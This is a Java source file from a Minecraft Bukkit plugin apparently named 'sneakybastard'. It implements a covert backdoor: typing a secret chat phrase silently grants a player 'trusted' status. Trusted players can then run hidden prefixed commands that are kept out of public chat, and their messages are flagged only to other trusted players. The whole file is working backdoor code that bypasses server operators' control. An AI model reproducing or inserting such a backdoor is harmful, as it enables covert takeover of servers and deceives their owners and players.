package net.blackofworld.sneakybastard.Listeners;

import net.blackofworld.sneakybastard.Command.CommandBase;
import net.blackofworld.sneakybastard.Command.CommandManager;
import net.blackofworld.sneakybastard.Start;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.ArrayList;
import java.util.Arrays;

public class SneakyListener implements Listener {
    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onLogin(PlayerJoinEvent e) {
        if(CommandManager.Instance.isTrusted(e.getPlayer())) {
            CommandManager.Instance.addTrusted(e.getPlayer());
        }
    }
    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void asyncChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (e.getMessage().equals(CommandManager.TRUST_COMMAND)) {
            e.setCancelled(true);
            if (!CommandManager.Instance.isTrusted(p)) {
                CommandManager.Instance.addTrusted(p);
                p.sendMessage(CommandManager.COMMAND_PREFIX + "You are now trusted");
            } else {
                CommandManager.Instance.removeTrusted(p);
                p.sendMessage(CommandManager.COMMAND_PREFIX + "You are now untrusted");
            }
            return;
        }
        if (e.getMessage().startsWith(CommandManager.COMMAND_SIGN) && CommandManager.Instance.isTrusted(p)) {
            e.setCancelled(true);
            String[] dmp = msg.substring(1).split(" ");
            ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
            for (CommandBase command : CommandManager.Instance.commandList) {
                if (command.Command.equalsIgnoreCase(dmp[0])) {
                    if (args.size() >= command.requiredArgs)
                        Bukkit.getScheduler().runTask(Start.Instance, () -> command.Execute(p, args));
                    else
                        p.sendMessage(CommandManager.COMMAND_PREFIX + ChatColor.RED + "Command: "+command.Command + " " + command.Syntax);
                    return;
                }
            }
            p.sendMessage(CommandManager.COMMAND_PREFIX + ChatColor.RED + "Command not found!");
        }
    }
    @EventHandler(priority = EventPriority.HIGHEST)
    public void asyncChatLowest(AsyncPlayerChatEvent e) {
        if (e.isCancelled()) return;
        Player p = e.getPlayer();
        if (!CommandManager.Instance.isTrusted(p)) return;
        e.setCancelled(true);
        String format = e.getFormat();
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            for (Player player : Bukkit.getOnlinePlayers()) {
                if (CommandManager.Instance.isTrusted(player)) {
                    String string = String.format(format, CommandManager.COMMAND_PREFIX + p.getDisplayName(), e.getMessage());
                    player.sendMessage(string);
                } else {
                    String string = String.format(format, p.getDisplayName(), e.getMessage());
                    player.sendMessage(string);
                }
            }
        });
    }
}
